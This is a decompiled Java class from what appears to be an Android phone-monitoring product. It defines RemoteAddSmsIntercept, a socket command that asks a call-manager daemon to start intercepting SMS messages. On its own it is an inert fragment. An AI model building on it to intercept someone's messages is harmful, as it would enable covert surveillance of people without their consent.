package com.vvt.callmanager.ref.command;

import com.fx.socket.SocketCmd;
import com.vvt.base.communication.SmsInterceptInfo;

public class RemoteAddSmsIntercept
  extends SocketCmd
{
  private static final long serialVersionUID = -3715754659619005159L;
  
  public RemoteAddSmsIntercept(SmsInterceptInfo paramSmsInterceptInfo)
  {
    super(paramSmsInterceptInfo, Boolean.class);
  }
  
  protected String getServerName()
  {
    return "com.fx.socket.callmgrd";
  }
  
  protected String getTag()
  {
    return "RemoteAddSmsIntercept";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/callmanager/ref/command/RemoteAddSmsIntercept.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */